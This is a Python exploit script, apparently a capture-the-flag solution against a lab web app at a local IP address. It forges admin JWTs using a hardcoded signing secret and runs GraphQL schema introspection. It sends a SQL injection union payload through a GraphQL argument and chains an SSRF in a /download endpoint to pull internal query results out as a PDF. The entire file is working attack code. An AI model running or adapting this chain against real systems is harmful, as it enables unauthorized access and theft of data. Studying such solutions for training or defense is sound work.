import jwt
import time
from datetime import timedelta, datetime, timezone
import requests
import os
from pdfquery import PDFQuery

url = "http://192.168.86.49:1337"

def generate_jwt(role):

    secret = "Str0ng_K3y_N0_l3ak_pl3ase?"

    payload = {
        'role': role,
        'iat': datetime.now(timezone.utc) + timedelta(seconds=3600)
    }

    token = jwt.encode(payload, secret, "HS256")
    return token

#r = requests.get(url + "/admin?token=" + generate_jwt("admin"))

#print(r.text)

query_grahpql = """
{
    __schema{
        types{
            name,
            fields{
                name
            }
        }
    }
}
"""

query_grahpql = """
{
    getAllData {
                name
                department
                isPresent
            }
}
"""

query_grahpql = """
{
    getDataByName(name: "1' union select 1,'<h1>hola</h1>','<h1>hola</h1>',4 -- -") {
        name
        department
        isPresent
    }
}
"""

# SSRF

data = {
    #"url": "http://127.0.0.1:1337/admin?token=" + generate_jwt("admin")
    "url": f"http://127.0.0.1:1337/graphql?query={query_grahpql}&token=" + generate_jwt("admin")
}

r = requests.post(url + "/download?token=" + generate_jwt("user"), data=data)

os.system("rm test.pdf")

f = open("test.pdf", "wb")
f.write(r.content)
f.close()

pdf = PDFQuery('test.pdf')
pdf.load()

# Use CSS-like selectors to locate the elements
text_elements = pdf.pq('LTTextLineHorizontal')

# Extract the text from the elements
[print(t.text) for t in text_elements]
